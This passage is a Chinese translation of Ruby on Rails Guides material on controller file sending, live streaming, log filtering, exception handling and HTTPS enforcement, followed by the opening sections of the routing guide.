在上面的代码中，download_pdf 动作调用私有方法 generate_pdf。generate_pdf 才是真正生成 PDF 的方法，返回值字符串形式的文件内容。返回的字符串会以数据流的形式发送给客户端，并为用户推荐一个文件名。有时发送文件流时，并不希望用户下载这个文件，比如嵌在 HTML 页面中的图片。告诉浏览器文件不是用来下载的，可以把 :disposition 选项设为 "inline"。这个选项的另外一个值，也是默认值，是 "attachment"。

###  12.1 发送文件

如果想发送硬盘上已经存在的文件，可以使用 send_file 方法。
class ClientsController < ApplicationController
  # Stream a file that has already been generated and stored on disk.
  def download_pdf
    client = Client.find(params[:id])
    send_file("#{Rails.root}/files/clients/#{client.id}.pdf",
              filename: "#{client.name}.pdf",
              type: "application/pdf")
  end
end

send_file 一次只发送 4kB，而不是一次把整个文件都写入内存。如果不想使用数据流方式，可以把 :stream 选项设为 false。如果想调整数据块大小，可以设置 :buffer_size 选项。

如果没有指定 :type 选项，Rails 会根据 :filename 中的文件扩展名猜测。如果没有注册扩展名对应的文件类型，则使用 application/octet-stream。

要谨慎处理用户提交数据（参数，cookies 等）中的文件路径，有安全隐患，你可能并不想让别人下载这个文件。

不建议通过 Rails 以数据流的方式发送静态文件，你可以把静态文件放在服务器的公共文件夹中，使用 Apache 或其他服务器下载效率更高，因为不用经由整个 Rails 处理。

###  12.2 使用 REST 的方式下载文件

虽然可以使用 send_data 方法发送数据，但是在 REST 架构的程序中，单独为下载文件操作写个动作有些多余。在 REST 架构下，上例中的 PDF 文件可以视作一种客户端资源。Rails 提供了一种更符合 REST 架构的文件下载方法。下面这段代码重写了前面的例子，把下载 PDF 文件的操作放在 show 动作中，不使用数据流：
class ClientsController < ApplicationController
  # The user can request to receive this resource as HTML or PDF.
  def show
    @client = Client.find(params[:id])
 
    respond_to do |format|
      format.html
      format.pdf { render pdf: generate_pdf(@client) }
    end
  end
end

为了让这段代码能顺利运行，要把 PDF MIME 加入 Rails。在 config/initializers/mime_types.rb 文件中加入下面这行代码即可：
Mime::Type.register "application/pdf", :pdf

设置文件不会在每次请求中都重新加载，所以为了让改动生效，需要重启服务器。

现在客户端请求 PDF 版本，只要在 URL 后加上 ".pdf" 即可：
GET /clients/1.pdf

###  12.3 任意数据的实时流

在 Rails 中，不仅文件可以使用数据流的方式处理，在响应对象中，任何数据都可以视作数据流。ActionController::Live 模块可以和浏览器建立持久连接，随时随地把数据传送给浏览器。

####  12.3.1 使用实时流

把 ActionController::Live 模块引入控制器中后，所有的动作都可以处理数据流。
class MyController < ActionController::Base
  include ActionController::Live
 
  def stream
    response.headers['Content-Type'] = 'text/event-stream'
    100.times {
      response.stream.write "hello world\n"
      sleep 1
    }
  ensure
    response.stream.close
  end
end

上面的代码会和浏览器建立持久连接，每秒一次，共发送 100 次 "hello world\n"。

关于这段代码有一些注意事项。必须关闭响应数据流。如果忘记关闭，套接字就会一直处于打开状态。发送数据流之前，还要把内容类型设为 text/event-stream。因为响应发送后（response.committed 返回真值后）就无法设置报头了。

####  12.3.2 使用举例

架设你在制作一个卡拉 OK 机，用户想查看某首歌的歌词。每首歌（Song）都有很多行歌词，每一行歌词都要花一些时间（num_beats）才能唱完。

如果按照卡拉 OK 机的工作方式，等上一句唱完才显示下一行，就要使用 ActionController::Live：
class LyricsController < ActionController::Base
  include ActionController::Live
 
  def show
    response.headers['Content-Type'] = 'text/event-stream'
    song = Song.find(params[:id])
 
    song.each do |line|
      response.stream.write line.lyrics
      sleep line.num_beats
    end
  ensure
    response.stream.close
  end
end

在这段代码中，只有上一句唱完才会发送下一句歌词。

####  12.3.3 使用数据流时的注意事项

以数据流的方式发送任意数据是个强大的功能，如前面几个例子所示，你可以选择何时发送什么数据。不过，在使用时，要注意以下事项：

    每次以数据流形式发送响应时都会新建一个线程，然后把原线程中的本地变量复制过来。线程中又太多的本地变量会降低性能。而且，线程太多也会影响性能。
    忘记关闭响应流会导致套接字一直处于打开状态。使用响应流时一定要记得调用 close 方法。
    WEBrick 会缓冲所有响应，因此引入 ActionController::Live 也不会有任何效果。你应该使用不自动缓冲响应的服务器。

##  13 过滤日志

Rails 在 log 文件夹中为每个环境都准备了一个日志文件。这些文件在调试时特别有用，但上线后的程序并不用把所有信息都写入日志。
###  13.1 过滤参数

要想过滤特定的请求参数，禁止写入日志文件，可以在程序的设置文件中设置 config.filter_parameters 选项。过滤掉得参数在日志中会显示为 [FILTERED]。
config.filter_parameters << :password
###  13.2 过滤转向

有时需要从日志文件中过滤掉一些程序转向的敏感数据，此时可以设置 config.filter_redirect 选项：
config.filter_redirect << 's3.amazonaws.com'

可以使用字符串，正则表达式，或者一个数组，包含字符串或正则表达式：
config.filter_redirect.concat ['s3.amazonaws.com', /private_path/]

匹配的 URL 会显示为 '[FILTERED]'。
##  14 异常处理

程序很有可能有错误，错误发生时会抛出异常，这些异常是需要处理的。例如，如果用户访问一个连接，但数据库中已经没有对应的资源了，此时 Active Record 会抛出 ActiveRecord::RecordNotFound 异常。

在 Rails 中，异常的默认处理方式是显示“500 Internal Server Error”消息。如果程序在本地运行，出错后会显示一个精美的调用堆栈，以及其他附加信息，让开发者快速找到错误的地方，然后修正。如果程序已经上线，Rails 则会简单的显示“500 Server Error”消息，如果是路由错误或记录不存在，则显示“404 Not Found”。有时你可能想换种方式捕获错误，以及如何显示报错信息。在 Rails 中，有很多层异常处理，详解如下。

###  14.1 默认的 500 和 404 模板

默认情况下，如果程序错误，会显示 404 或者 500 错误消息。错误消息在 public 文件夹中的静态 HTML 文件中，分别是 404.html 和 500.html。你可以修改这两个文件，添加其他信息或布局，不过要记住，这两个是静态文件，不能使用 RHTML，只能写入纯粹的 HTML。
###  14.2 rescue_from

捕获错误后如果想做更详尽的处理，可以使用 rescue_form。rescue_from 可以处理整个控制器及其子类中的某种（或多种）异常。

异常发生时，会被 rescue_from 捕获，异常对象会传入处理代码。处理异常的代码可以是方法，也可以是 Proc 对象，由 :with 选项指定。也可以不用 Proc 对象，直接使用块。

下面的代码使用 rescue_from 截获所有 ActiveRecord::RecordNotFound 异常，然后做相应的处理。
class ApplicationController < ActionController::Base
  rescue_from ActiveRecord::RecordNotFound, with: :record_not_found
 
  private
 
    def record_not_found
      render plain: "404 Not Found", status: 404
    end
end

这段代码对异常的处理并不详尽，比默认的处理也没好多少。不过只要你能捕获异常，就可以做任何想做的处理。例如，可以新建一个异常类，用户无权查看页面时抛出：
class ApplicationController < ActionController::Base
  rescue_from User::NotAuthorized, with: :user_not_authorized
 
  private
 
    def user_not_authorized
      flash[:error] = "You don't have access to this section."
      redirect_to :back
    end
end
 
class ClientsController < ApplicationController
  # Check that the user has the right authorization to access clients.
  before_action :check_authorization
 
  # Note how the actions don't have to worry about all the auth stuff.
  def edit
    @client = Client.find(params[:id])
  end
 
  private
 
    # If the user is not authorized, just throw the exception.
    def check_authorization
      raise User::NotAuthorized unless current_user.admin?
    end
end

某些异常只能在 ApplicationController 中捕获，因为在异常抛出前控制器还没初始化，动作也没执行。详情参见 Pratik Naik 的文章。
##  15 强制使用 HTTPS 协议

有时，基于安全考虑，可能希望某个控制器只能通过 HTTPS 协议访问。为了达到这个目的，可以在控制器中使用 force_ssl 方法：
class DinnerController
  force_ssl
end

和过滤器类似，也可指定 :only 或 :except 选项，设置只在某些动作上强制使用 HTTPS：
class DinnerController
  force_ssl only: :cheeseburger
  # or
  force_ssl except: :cheeseburger
end

注意，如果你在很多控制器中都使用了 force_ssl，或许你想让整个程序都使用 HTTPS。此时，你可以在环境设置文件中设置 config.force_ssl 选项。
##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Rails 路由全解

本文介绍面向用户的 Rails 路由功能。

读完本文，你将学到：

    如何理解 routes.rb 文件中的代码；
    如何使用推荐的资源式，或使用 match 方法编写路由；
    动作能接收到什么参数；
    如何使用路由帮助方法自动创建路径和 URL；
    约束和 Rack 端点等高级技术；

Chapters

    Rails 路由的作用
        把 URL 和代码连接起来
        生成路径和 URL
    资源路径：Rails 的默认值
        网络中的资源
        CRUD，HTTP 方法和动作
        路径和 URL 帮助方法
        一次声明多个资源路由
        单数资源
        控制器命名空间和路由
        嵌套资源
        Routing Concerns
        由对象创建路径和 URL
        添加更多的 REST 架构动作
    非资源式路由
        绑定参数
        动态路径片段
        静态路径片段
        查询字符串
        定义默认值
        命名路由
        HTTP 方法约束
        路径片段约束
        基于请求的约束
        高级约束
        通配片段
        重定向
        映射到 Rack 程序
        使用 root
        Unicode 字符路由
    定制资源式路由
        指定使用的控制器
        指定约束
        改写具名帮助方法
        改写 new 和 edit 片段
        为具名路由帮助方法加上前缀
        限制生成的路由
        翻译路径
        改写单数形式
        在嵌套资源中使用 :as 选项
    路由审查和测试
        列出现有路由
        测试路由

##  1 Rails 路由的作用

Rails 路由能识别 URL，将其分发给控制器的动作进行处理，还能生成路径和 URL，无需直接在视图中硬编码字符串。
###  1.1 把 URL 和代码连接起来

Rails 程序收到如下请求时
GET /patients/17

会查询路由，找到匹配的控制器动作。如果首个匹配的路由是：
get '/patients/:id', to: 'patients#show'

那么这个请求就交给 patients 控制器的 show 动作处理，并把 { id: '17' } 传入 params。
###  1.2 生成路径和 URL

通过路由还可生成路径和 URL。如果把前面的路由修改成：
get '/patients/:id', to: 'patients#show', as: 'patient'

在控制器中有如下代码：
@patient = Patient.find(17)

在相应的视图中有如下代码：
<%= link_to 'Patient Record', patient_path(@patient) %>

那么路由就会生成路径 /patients/17。这么做代码易于维护、理解。注意，在路由帮助方法中无需指定 ID。

##  2 资源路径：Rails 的默认值

使用资源路径可以快速声明资源式控制器所有的常规路由，无需分别为 index、show、new、edit、create、update 和 destroy 动作分别声明路由，只需一行代码就能搞定。
###  2.1 网络中的资源

浏览器向 Rails 程序请求页面时会使用特定的 HTTP 方法，例如 GET、POST、PATCH、PUT 和 DELETE。每个方法对应对资源的一种操作。资源路由会把一系列相关请求映射到单个路由器的不同动作上。

如果 Rails 程序收到如下请求：
DELETE /photos/17

会查询路由将其映射到一个控制器的路由上。如果首个匹配的路由是：
resources :photos

那么这个请求就交给 photos 控制器的 destroy 方法处理，并把 { id: '17' } 传入 params。
###  2.2 CRUD，HTTP 方法和动作

在 Rails 中，资源式路由把 HTTP 方法和 URL 映射到控制器的动作上。而且根据约定，还映射到数据库的 CRUD 操作上。路由文件中如下的单行声明：
resources :photos

会创建七个不同的路由，全部映射到 Photos 控制器上：
HTTP 方法 	路径 	控制器#动作 	作用
GET 	/photos 	photos#index 	显示所有图片
GET 	/photos/new 	photos#new 	显示新建图片的表单
POST 	/photos 	photos#create 	新建图片
GET 	/photos/:id 	photos#show 	显示指定的图片
GET 	/photos/:id/edit 	photos#edit 	显示编辑图片的表单
PATCH/PUT 	/photos/:id 	photos#update 	更新指定的图片
DELETE 	/photos/:id 	photos#destroy 	删除指定的图片

路由使用 HTTP 方法和 URL 匹配请求，把四个 URL 映射到七个不同的动作上。 I> NOTE: 路由按照声明的顺序匹配哦，如果在 get 'photos/poll' 之前声明了 resources :photos，那么 show 动作的路由由 resources 这行解析。如果想使用 get 这行，就要将其移到 resources 之前。
###  2.3 路径和 URL 帮助方法

声明资源式路由后，会自动创建一些帮助方法。以 resources :photos 为例：

    photos_path 返回 /photos
    new_photo_path 返回 /photos/new
    edit_photo_path(:id) 返回 /photos/:id/edit，例如 edit_photo_path(10) 返回 /photos/10/edit
    photo_path(:id) 返回 /photos/:id，例如 photo_path(10) 返回 /photos/10

这些帮助方法都有对应的 _url 形式，例如 photos_url，返回主机、端口加路径。
###  2.4 一次声明多个资源路由

如果需要为多个资源声明路由，可以节省一点时间，调用一次 resources 方法完成：
resources :photos, :books, :videos

这种方式等价于：
resources :photos
resources :books
resources :videos
###  2.5 单数资源

有时希望不用 ID 就能查看资源，例如，/profile 一直显示当前登入用户的个人信息。针对这种需求，可以使用单数资源，把 /profile（不是 /profile/:id）映射到 show 动作：
get 'profile', to: 'users#show'

如果 get 方法的 to 选项是字符串，要使用 controller#action 形式；如果是 Symbol，就可以直接指定动作：
get 'profile', to: :show

下面这个资源式路由：
resource :geocoder

会生成六个路由，全部映射到 Geocoders 控制器：
HTTP 方法 	路径 	控制器#动作 	作用
GET 	/geocoder/new 	geocoders#new 	显示新建 geocoder 的表单
POST 	/geocoder 	geocoders#create 	新建 geocoder
GET 	/geocoder 	geocoders#show 	显示唯一的 geocoder 资源
GET 	/geocoder/edit 	geocoders#edit 	显示编辑 geocoder 的表单
PATCH/PUT 	/geocoder 	geocoders#update 	更新唯一的 geocoder 资源
DELETE 	/geocoder 	geocoders#destroy 	删除 geocoder 资源

有时需要使用同个控制器处理单数路由（例如 /account）和复数路由（例如 /accounts/45），把单数资源映射到复数控制器上。例如，resource :photo 和 resources :photos 分别声明单数和复数路由，映射到同个控制器（PhotosController）上。

单数资源式路由生成以下帮助方法：

    new_geocoder_path 返回 /geocoder/new
    edit_geocoder_path 返回 /geocoder/edit
    geocoder_path 返回 /geocoder

和复数资源一样，上面各帮助方法都有对应的 _url 形式，返回主机、端口加路径。

有个一直存在的问题导致 form_for 无法自动处理单数资源。为了解决这个问题，可以直接指定表单的 URL，例如：
form_for @geocoder, url: geocoder_path do |f|
###  2.6 控制器命名空间和路由

你可能想把一系列控制器放在一个命名空间内，最常见的是把管理相关的控制器放在 Admin:: 命名空间内。你需要把这些控制器存在 app/controllers/admin 文件夹中，然后在路由中做如下声明：
namespace :admin do
  resources :posts, :comments
end

上述代码会为 posts 和 comments 控制器生成很多路由。对 Admin::PostsController 来说，Rails 会生成：
HTTP 方法 	路径 	控制器#动作 	具名帮助方法
GET 	/admin/posts 	admin/posts#index 	admin_posts_path
GET 	/admin/posts/new 	admin/posts#new 	new_admin_post_path
POST 	/admin/posts 	admin/posts#create 	admin_posts_path
GET 	/admin/posts/:id 	admin/posts#show 	admin_post_path(:id)
GET 	/admin/posts/:id/edit 	admin/posts#edit 	edit_admin_post_path(:id)
PATCH/PUT 	/admin/posts/:id 	admin/posts#update 	admin_post_path(:id)
DELETE 	/admin/posts/:id 	admin/posts#destroy 	admin_post_path(:id)

如果想把 /posts（前面没有 /admin）映射到 Admin::PostsController 控制器上，可以这么声明：
scope module: 'admin' do
  resources :posts, :comments
end

如果只有一个资源，还可以这么声明：
resources :posts, module: 'admin'

如果想把 /admin/posts 映射到 PostsController 控制器（不在 Admin:: 命名空间内），可以这么声明：
scope '/admin' do
  resources :posts, :comments
end

如果只有一个资源，还可以这么声明：
resources :posts, path: '/admin/posts'

在上述两种用法中，具名路由没有变化，跟不用 scope 时一样。在后一种用法中，映射到 PostsController 控制器上的路径如下：
HTTP 方法 	路径 	控制器#动作 	具名帮助方法
GET 	/admin/posts 	posts#index 	posts_path
GET 	/admin/posts/new 	posts#new 	new_post_path
POST 	/admin/posts 	posts#create 	posts_path
GET 	/admin/posts/:id 	posts#show 	post_path(:id)
GET 	/admin/posts/:id/edit 	posts#edit 	edit_post_path(:id)
PATCH/PUT 	/admin/posts/:id 	posts#update 	post_path(:id)
DELETE 	/admin/posts/:id 	posts#destroy 	post_path(:id)

如果在 namespace 代码块中想使用其他的控制器命名空间，可以指定控制器的绝对路径，例如 get '/foo' => '/foo#index'。
###  2.7 嵌套资源

开发程序时经常会遇到一个资源是其他资源的子资源这种情况。假设程序中有如下的模型：
class Magazine < ActiveRecord::Base
  has_many :ads
end
 
class Ad < ActiveRecord::Base
  belongs_to :magazine
end

在路由中可以使用“嵌套路由”反应这种关系。针对这个例子，可以声明如下路由：
resources :magazines do
  resources :ads
end

除了创建 MagazinesController 的路由之外，上述声明还会创建 AdsController 的路由。广告的 URL 要用到杂志资源：
HTTP 方法 	路径 	控制器#动作 	作用
GET 	/magazines/:magazine_id/ads 	ads#index 	显示指定杂志的所有广告
GET 	/magazines/:magazine_id/ads/new 	ads#new 	显示新建广告的表单，该告属于指定的杂志
POST 	/magazines/:magazine_id/ads 	ads#create 	创建属于指定杂志的广告
GET 	/magazines/:magazine_id/ads/:id 	ads#show 	显示属于指定杂志的指定广告
GET 	/magazines/:magazine_id/ads/:id/edit 	ads#edit 	显示编辑广告的表单，该广告属于指定的杂志
PATCH/PUT 	/magazines/:magazine_id/ads/:id 	ads#update 	更新属于指定杂志的指定广告
DELETE 	/magazines/:magazine_id/ads/:id 	ads#destroy 	删除属于指定杂志的指定广告

上述路由还会生成 magazine_ads_url 和 edit_magazine_ad_path 等路由帮助方法。这些帮助方法的第一个参数是 Magazine 实例，例如 magazine_ads_url(@magazine)。
####  2.7.1 嵌套限制

嵌套路由可以放在其他嵌套路由中，例如：
resources :publishers do
  resources :magazines do
    resources :photos
  end
end

层级较多的嵌套路由很难处理。例如，程序可能要识别如下的路径：
/publishers/1/magazines/2/photos/3

对应的路由帮助方法是 publisher_magazine_photo_url，要指定三个层级的对象。这种用法很让人困扰，Jamis Buck 在一篇文章中指出了嵌套路由的用法总则，即：

嵌套资源不可超过一层。
####  2.7.2 浅层嵌套

避免深层嵌套的方法之一，是把控制器集合动作放在父级资源中，表明层级关系，但不嵌套成员动作。也就是说，用最少的信息表明资源的路由关系，如下所示：
resources :posts do
  resources :comments, only: [:index, :new, :create]
end
resources :comments, only: [:show, :edit, :update, :destroy]

这种做法在描述路由和深层嵌套之间做了适当的平衡。上述代码还有简写形式，即使用 :shallow 选项：
resources :posts do
  resources :comments, shallow: true
end

这种形式生成的路由和前面一样。:shallow 选项还可以在父级资源中使用，此时所有嵌套其中的资源都是浅层嵌套：
resources :posts, shallow: true do
  resources :comments
  resources :quotes
  resources :drafts
end

shallow 方法可以创建一个作用域，其中所有嵌套都是浅层嵌套。如下代码生成的路由和前面一样：
shallow do
  resources :posts do
    resources :comments
    resources :quotes
    resources :drafts
  end
end

scope 方法有两个选项可以定制浅层嵌套路由。:shallow_path 选项在成员路径前加上指定的前缀：
scope shallow_path: "sekret" do
  resources :posts do
    resources :comments, shallow: true
  end
end

上述代码为 comments 资源生成的路由如下：
HTTP 方法 	路径 	控制器#动作 	具名帮助方法
GET 	/posts/:post_id/comments(.:format) 	comments#index 	post_comments_path
POST 	/posts/:post_id/comments(.:format) 	comments#create 	post_comments_path
GET 	/posts/:post_id/comments/new(.:format) 	comments#new 	new_post_comment_path
GET 	/sekret/comments/:id/edit(.:format) 	comments#edit 	edit_comment_path
GET 	/sekret/comments/:id(.:format) 	comments#show 	comment_path
PATCH/PUT 	/sekret/comments/:id(.:format) 	comments#update 	comment_path
DELETE 	/sekret/comments/:id(.:format) 	comments#destroy 	comment_path

:shallow_prefix 选项在具名帮助方法前加上指定的前缀：
scope shallow_prefix: "sekret" do
  resources :posts do
    resources :comments, shallow: true
  end
end

上述代码为 comments 资源生成的路由如下：
HTTP 方法 	路径 	控制器#动作 	具名帮助方法
GET 	/posts/:post_id/comments(.:format) 	comments#index 	post_comments_path
POST 	/posts/:post_id/comments(.:format) 	comments#create 	post_comments_path
GET 	/posts/:post_id/comments/new(.:format) 	comments#new 	new_post_comment_path
GET 	/comments/:id/edit(.:format) 	comments#edit 	edit_sekret_comment_path
GET 	/comments/:id(.:format) 	comments#show 	sekret_comment_path
PATCH/PUT 	/comments/:id(.:format) 	comments#update 	sekret_comment_path
DELETE 	/comments/:id(.:format) 	comments#destroy 	sekret_comment_path

###  2.8 Routing Concerns

Routing Concerns 用来声明通用路由，可在其他资源和路由中重复使用。定义 concern 的方式如下：
concern :commentable do
  resources :comments
end
 
concern :image_attachable do
  resources :images, only: :index
end

Concerns 可在资源中重复使用，避免代码重复：
resources :messages, concerns: :commentable
 
resources :posts, concerns: [:commentable, :image_attachable]

上述声明等价于：
resources :messages do
  resources :comments
end
 
resources :posts do
  resources :comments
  resources :images, only: :index
end

Concerns 在路由的任何地方都能使用，例如，在作用域或命名空间中：
namespace :posts do
  concerns :commentable
end
###  2.9 由对象创建路径和 URL

除了使用路由帮助方法之外，Rails 还能从参数数组中创建路径和 URL。例如，假设有如下路由：
resources :magazines do
  resources :ads
end

使用 magazine_ad_path 时，可以不传入数字 ID，传入 Magazine 和 Ad 实例即可：
<%= link_to 'Ad details', magazine_ad_path(@magazine, @ad) %>

而且还可使用 url_for 方法，指定一组对象，Rails 会自动决定使用哪个路由：
<%= link_to 'Ad details', url_for([@magazine, @ad]) %>

此时，Rails 知道 @magazine 是 Magazine 的实例，@ad 是 Ad 的实例，所以会调用 magazine_ad_path 帮助方法。使用 link_to 等方法时，无需使用完整的 url_for 方法，直接指定对象即可：
<%= link_to 'Ad details', [@magazine, @ad] %>

如果想链接到一本杂志，可以这么做：
<%= link_to 'Magazine details', @magazine %>

要想链接到其他动作，把数组的第一个元素设为所需动作名即可：
<%= link_to 'Edit Ad', [:edit, @magazine, @ad] %>

在这种用法中，会把模型实例转换成对应的 URL，这是资源式路由带来的主要好处之一。
###  2.10 添加更多的 REST 架构动作

可用的路由并不局限于 REST 路由默认创建的那七个，还可以添加额外的集合路由或成员路由。
####  2.10.1 添加成员路由

要添加成员路由，在 resource 代码块中使用 member 块即可：
resources :photos do
  member do
    get 'preview'
  end
end

这段路由能识别 /photos/1/preview 是个 GET 请求，映射到 PhotosController 的 preview 动作上，资源的 ID 传入 params[:id]。同时还生成了 preview_photo_url 和 preview_photo_path 两个帮助方法。

在 member 代码块中，每个路由都要指定使用的 HTTP 方法。可以使用 get，patch，put，post 或 delete。如果成员路由不多，可以不使用代码块形式，直接在路由上使用 :on 选项：
resources :photos do
  get 'preview', on: :member
end

也可以不使用 :on 选项，得到的成员路由是相同的，但资源 ID 存储在 params[:photo_id] 而不是 params[:id] 中。
####  2.10.2 添加集合路由

添加集合路由的方式如下：
resources :photos do
  collection do
    get 'search'
  end
end

这段路由能识别 /photos/search 是个 GET 请求，映射到 PhotosController 的 search 动作上。同时还会生成 search_photos_url 和 search_photos_path 两个帮助方法。

和成员路由一样，也可使用 :on 选项：
resources :photos do
  get 'search', on: :collection
end
####  2.10.3 添加额外新建动作的路由

要添加额外的新建动作，可以使用 :on 选项：
resources :comments do
  get 'preview', on: :new
end

这段代码能识别 /comments/new/preview 是个 GET 请求，映射到 CommentsController 的 preview 动作上。同时还会生成 preview_new_comment_url 和 preview_new_comment_path 两个路由帮助方法。

如果在资源式路由中添加了过多额外动作，这时就要停下来问自己，是不是要新建一个资源。

##  3 非资源式路由

除了资源路由之外，Rails 还提供了强大功能，把任意 URL 映射到动作上。此时，不会得到资源式路由自动生成的一系列路由，而是分别声明各个路由。

虽然一般情况下要使用资源式路由，但也有一些情况使用简单的路由更合适。如果不合适，也不用非得使用资源实现程序的每种功能。

简单的路由特别适合把传统的 URL 映射到 Rails 动作上。
###  3.1 绑定参数

声明常规路由时，可以提供一系列 Symbol，做为 HTTP 请求的一部分，传入 Rails 程序。其中两个 Symbol 有特殊作用：:controller 映射程序的控制器名，:action 映射控制器中的动作名。例如，有下面的路由：
get ':controller(/:action(/:id))'

如果 /photos/show/1 由这个路由处理（没匹配路由文件中其他路由声明），会映射到 PhotosController 的 show 动作上，最后一个参数 "1" 可通过 params[:id] 获取。上述路由还能处理 /photos 请求，映射到 PhotosController#index，因为 :action 和 :id 放在括号中，是可选参数。
###  3.2 动态路径片段

在常规路由中可以使用任意数量的动态片段。:controller 和 :action 之外的参数都会存入 params 传给动作。如果有下面的路由：
get ':controller/:action/:id/:user_id'

/photos/show/1/2 请求会映射到 PhotosController 的 show 动作。params[:id] 的值是 "1"，params[:user_id] 的值是 "2"。

匹配控制器时不能使用 :namespace 或 :module。如果需要这种功能，可以为控制器做个约束，匹配所需的命名空间。例如： I> I> I>ruby NOTE: get ':controller(/:action(/:id))', controller: /admin\/[^\/]+/ NOTE:

默认情况下，动态路径片段中不能使用点号，因为点号是格式化路由的分隔符。如果需要在动态路径片段中使用点号，可以添加一个约束条件。例如，id: /[^\/]+/ 可以接受除斜线之外的所有字符。
###  3.3 静态路径片段

声明路由时可以指定静态路径片段，片段前不加冒号即可：
get ':controller/:action/:id/with_user/:user_id'

这个路由能响应 /photos/show/1/with_user/2 这种路径。此时，params 的值为 { controller: 'photos', action: 'show', id: '1', user_id: '2' }。
###  3.4 查询字符串

params 中还包含查询字符串中的所有参数。例如，有下面的路由：
get ':controller/:action/:id'

/photos/show/1?user_id=2 请求会映射到 Photos 控制器的 show 动作上。params 的值为 { controller: 'photos', action: 'show', id: '1', user_id: '2' }。
###  3.5 定义默认值

在路由中无需特别使用 :controller 和 :action，可以指定默认值：
get 'photos/:id', to: 'photos#show'

这样声明路由后，Rails 会把 /photos/12 映射到 PhotosController 的 show 动作上。

路由中的其他部分也使用 :defaults 选项设置默认值。甚至可以为没有指定的动态路径片段设定默认值。例如：
get 'photos/:id', to: 'photos#show', defaults: { format: 'jpg' }

Rails 会把 photos/12 请求映射到 PhotosController 的 show 动作上，把 params[:format] 的值设为 "jpg"。
###  3.6 命名路由

使用 :as 选项可以为路由起个名字：
get 'exit', to: 'sessions#destroy', as: :logout

这段路由会生成 logout_path 和 logout_url 这两个具名路由帮助方法。调用 logout_path 方法会返回 /exit。

使用 :as 选项还能重设资源的路径方法，例如：
get ':username', to: 'users#show', as: :user

这段路由会定义一个名为 user_path 的方法，可在控制器、帮助方法和视图中使用。在 UsersController 的 show 动作中，params[:username] 的值即用户的用户名。如果不想使用 :username 作为参数名，可在路由声明中修改。
###  3.7 HTTP 方法约束

一般情况下，应该使用 get、post、put、patch 和 delete 方法限制路由可使用的 HTTP 方法。如果使用 match 方法，可以通过 :via 选项一次指定多个 HTTP 方法：
match 'photos', to: 'photos#show', via: [:get, :post]

如果某个路由想使用所有 HTTP 方法，可以使用 via: :all：
match 'photos', to: 'photos#show', via: :all

同个路由即处理 GET 请求又处理 POST 请求有安全隐患。一般情况下，除非有特殊原因，切记不要允许在一个动作上使用所有 HTTP 方法。
###  3.8 路径片段约束

可使用 :constraints 选项限制动态路径片段的格式：
get 'photos/:id', to: 'photos#show', constraints: { id: /[A-Z]\d{5}/ }

这个路由能匹配 /photos/A12345，但不能匹配 /photos/893。上述路由还可简化成：
get 'photos/:id', to: 'photos#show', id: /[A-Z]\d{5}/

:constraints 选项中的正则表达式不能使用“锚记”。例如，下面的路由是错误的：
get '/:id', to: 'posts#show', constraints: {id: /^\d/}

之所以不能使用锚记，是因为所有正则表达式都从头开始匹配。

例如，有下面的路由。如果 to_param 方法得到的值以数字开头，例如 1-hello-world，就会把请求交给 posts 控制器处理；如果 to_param 方法得到的值不以数字开头，例如 david，就交给 users 控制器处理。
get '/:id', to: 'posts#show', constraints: { id: /\d.+/ }
get '/:username', to: 'users#show'
###  3.9 基于请求的约束

约束还可以根据任何一个返回值为字符串的 Request 方法设定。

基于请求的约束和路径片段约束的设定方式一样：
get 'photos', constraints: {subdomain: 'admin'}

约束还可使用代码块形式：
namespace :admin do
  constraints subdomain: 'admin' do
    resources :photos
  end
end
###  3.10 高级约束

如果约束很复杂，可以指定一个能响应 matches? 方法的对象。假设要用 BlacklistConstraint 过滤所有用户，可以这么做：
class BlacklistConstraint
  def initialize
    @ips = Blacklist.retrieve_ips
  end
 
  def matches?(request)
    @ips.include?(request.remote_ip)
  end
end
 
TwitterClone::Application.routes.draw do
  get '*path', to: 'blacklist#index',
    constraints: BlacklistConstraint.new
end

约束还可以在 lambda 中指定：
TwitterClone::Application.routes.draw do
  get '*path', to: 'blacklist#index',
    constraints: lambda { |request| Blacklist.retrieve_ips.include?(request.remote_ip) }
end

matches? 方法和 lambda 的参数都是 request 对象。
###  3.11 通配片段

路由中的通配符可以匹配其后的所有路径片段。例如：
get 'photos/*other', to: 'photos#unknown'

这个路由可以匹配 photos/12 或 /photos/long/path/to/12，params[:other] 的值为 "12" 或 "long/path/to/12"。以星号开头的路径片段叫做“通配片段”。

通配片段可以出现在路由的任何位置。例如：
get 'books/*section/:title', to: 'books#show'

这个路由可以匹配 books/some/section/last-words-a-memoir，params[:section] 的值为 'some/section'，params[:title] 的值为 'last-words-a-memoir'。

严格来说，路由中可以有多个通配片段。匹配器会根据直觉赋值各片段。例如：
get '*a/foo/*b', to: 'test#index'

这个路由可以匹配 zoo/woo/foo/bar/baz，params[:a] 的值为 'zoo/woo'，params[:b] 的值为 'bar/baz'。

如果请求 '/foo/bar.json'，那么 params[:pages] 的值为 'foo/bar'，请求类型为 JSON。如果想使用 Rails 3.0.x 中的表现，可以指定 format: false 选项，如下所示： I> I> I>ruby NOTE: get '*pages', to: 'pages#show', format: false NOTE: I> NOTE: 如果必须指定格式，可以指定 format: true 选项，如下所示： I> I> I>ruby NOTE: get '*pages', to: 'pages#show', format: true NOTE:
###  3.12 重定向

在路由中可以使用 redirect 帮助方法把一个路径重定向到另一个路径：
get '/stories', to: redirect('/posts')

重定向时还可使用匹配的动态路径片段：
get '/stories/:name', to: redirect('/posts/%{name}')

redirect 还可使用代码块形式，传入路径参数和 request 对象作为参数：
get '/stories/:name', to: redirect {|path_params, req| "/posts/#{path_params[:name].pluralize}" }
get '/stories', to: redirect {|path_params, req| "/posts/#{req.subdomain}" }

注意，redirect 实现的是 301 "Moved Permanently" 重定向，有些浏览器或代理服务器会缓存这种重定向，导致旧的页面不可用。

如果不指定主机（http://www.example.com），Rails 会从当前请求中获取。
###  3.13 映射到 Rack 程序

